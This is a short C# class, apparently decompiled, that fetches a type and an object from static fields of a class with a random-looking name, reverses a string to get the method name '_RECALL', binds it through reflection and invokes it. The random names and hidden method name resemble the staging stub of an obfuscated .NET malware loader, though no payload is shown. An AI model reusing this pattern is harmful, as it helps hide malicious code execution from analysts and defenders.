using System;
using System.Reflection;
using System.Runtime.CompilerServices;
using Microsoft.VisualBasic;
using iUsRxYmTcG;

namespace Classes;

public class Eax2
{
	public delegate void D1();

	private Delegate TempDelegate;

	public Eax2(object[] args)
	{
		Type type = jOjSgNgYyF._type;
		jOjSgNgYyF._type = null;
		string name = Strings.StrReverse("LLACER_");
		MethodInfo method = type.GetMethod(name);
		object objectValue = RuntimeHelpers.GetObjectValue(jOjSgNgYyF.inz);
		jOjSgNgYyF.inz = null;
		Delegate @delegate = (TempDelegate = Delegate.CreateDelegate(typeof(D1), RuntimeHelpers.GetObjectValue(objectValue), method, throwOnBindFailure: false));
		OhYeah();
	}

	private void OhYeah()
	{
		TempDelegate.DynamicInvoke();
	}
}
